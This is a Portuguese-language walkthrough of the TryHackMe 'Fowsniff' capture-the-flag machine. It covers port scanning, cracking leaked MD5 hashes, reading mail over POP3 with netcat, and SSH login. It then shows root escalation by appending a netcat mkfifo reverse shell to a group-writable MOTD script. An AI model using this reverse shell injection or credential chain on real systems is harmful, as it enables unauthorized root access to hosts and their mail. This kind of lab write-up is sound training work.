---
title: "Fowsniff CTF"
date: 2026-06-13
summary: "OSINT, quebra de hashes, acesso a e-mails via POP3 e escalada por scripts MOTD vulneráveis."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Linux"
tags: ["OSINT", "POP3", "Hash Cracking", "MOTD"]
draft: false
---

## Visão Geral

Neste CTF da Fowsniff CTF, explorei um cenário bem real de vazamento de dados. Precisei usar OSINT para achar hashes expostos na internet, quebrar as senhas e ler os e-mails corporativos via POP3. Depois disso, consegui escalar privilégios abusando de uma falha de permissão nos scripts do MOTD executados durante o login no servidor.

## Reconhecimento

Antes de tudo, adicionei o IP da máquina e o domínio `fow.thm` no meu arquivo `/etc/hosts`.

*Configuração do /etc/hosts*
```bash
sudo nano /etc/hosts
# Adicionar: <IP-DA-MAQUINA> fow.thm
```

Feito isso, comecei mapeando a rede com o **Nmap**.

*Varredura de portas com Nmap*
```bash
nmap -sC -sV -T4 <IP-DA-MAQUINA>
```

Encontrei quatro portas abertas:
- **Porta 22**: SSH
- **Porta 80**: HTTP (Servidor Web)
- **Porta 110**: POP3 (Recebimento de E-mail)
- **Porta 143**: IMAP (Recebimento de E-mail)


![Resultado do Nmap confirmando os serviços abertos.](/images/writeups/fowsniff/nmap.png)

Quando acessei a porta 80 no navegador, vi um aviso dizendo que a "Fowsniff" tinha sofrido um ataque e que dados poderiam ter vazado. O site mandava olhar o Twitter (X) da empresa, o que foi a deixa perfeita para começar o *OSINT*.

## Exploração Inicial e OSINT

Pesquisei sobre a empresa no Twitter e achei um link do Pastebin com um vazamento do banco de dados deles.

Lá, encontrei e-mails de vários funcionários junto com *hashes* em **MD5**.

![Vazamento de hashes MD5 encontrados através de OSINT.](/images/writeups/fowsniff/fowsniff_hashes.png)

Joguei esses hashes no **CrackStation** e consegui as senhas em texto claro em poucos segundos. Com as senhas na mão, fui testar no serviço de e-mail corporativo.

Conectei na porta 110 usando o **Netcat** para consultar as caixas de entrada.

*Autenticação no serviço POP3 para leitura de e-mails*
```bash
nc <IP-DA-MAQUINA> 110
USER seina
PASS <senha-crackeada>
LIST
RETR 1
```

![Acesso ao POP3.](/images/writeups/fowsniff/fowsniff_pop3.png)

Em um dos e-mails lidos, o pessoal de TI estava passando uma senha provisória de acesso SSH para o usuário `baksteen`.

## Obtenção de Shell e Movimentação Lateral

Usei a senha que roubei do e-mail para logar no **SSH** com a conta do `baksteen`.

*Acesso ao servidor via SSH*
```bash
ssh baksteen@<IP-DA-MAQUINA>
```

Consegui o acesso inicial e já peguei a *flag* de usuário comum. Depois disso, comecei a fuçar o servidor para tentar escalar privilégios.

## Escalada de Privilégios

Rodei o comando `id` para ver em quais grupos o `baksteen` estava. Notei que, além dos grupos normais, ele fazia parte de um grupo chamado `users`.

Então, fiz uma busca por arquivos que o pessoal desse grupo pudesse modificar no servidor:

*Buscando por arquivos graváveis pelo grupo 'users'*
```bash
find / -group users -type f 2>/dev/null
```

O `find` me retornou que os scripts do diretório `/etc/update-motd.d/` tinham permissão de escrita para esse grupo. Esses arquivos geram a mensagem de boas-vindas (MOTD) do Linux logo que alguém loga via console, e o mais grave: eles rodam como **root**.

Já que eu podia editar esses scripts, injetei um código de *reverse shell* (`Netcat`) direto no arquivo `00-header`.

*Injeção de shell reverso no MOTD*
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SEU_IP_VPN> 4444 >/tmp/f' >> /etc/update-motd.d/00-header
```

Abri uma porta na minha máquina de ataque com o Netcat para escutar a conexão:

*Inicializando ouvinte na porta 4444*
```bash
nc -lnvp 4444
```

Depois de tudo pronto, abri outra aba no terminal e loguei de novo via SSH como `baksteen`. Quando o servidor tentou exibir a mensagem de boas-vindas do MOTD, ele acabou executando meu script como superusuário e me entregou um *shell root* direto no ouvinte.

## Conclusão

A Fowsniff CTF é um ótimo exemplo do perigo de senhas vazadas. O desafio mostrou como o OSINT ajuda a conseguir o primeiro acesso à rede, provando que a segurança da empresa vai além dos servidores locais e passa também pelo que está exposto na internet (como Pastebin).

A técnica de explorar o MOTD foi bem interessante. Ela ensina na prática por que precisamos tomar cuidado ao dar permissões de escrita (`chmod`) para grupos não administrativos em scripts que rodam automaticamente no boot ou no login. Um erro simples de permissão aí, e o sistema inteiro fica comprometido.

## Referências

- OffSec. *OSINT Overview*. Disponível em: <https://www.offsec.com/>
- CrackStation. *Free Password Hash Cracker*. Disponível em: <https://crackstation.net/>
- HackTricks. *Linux Privilege Escalation - Cron & Scheduled Tasks*. Disponível em: <https://book.hacktricks.xyz/>
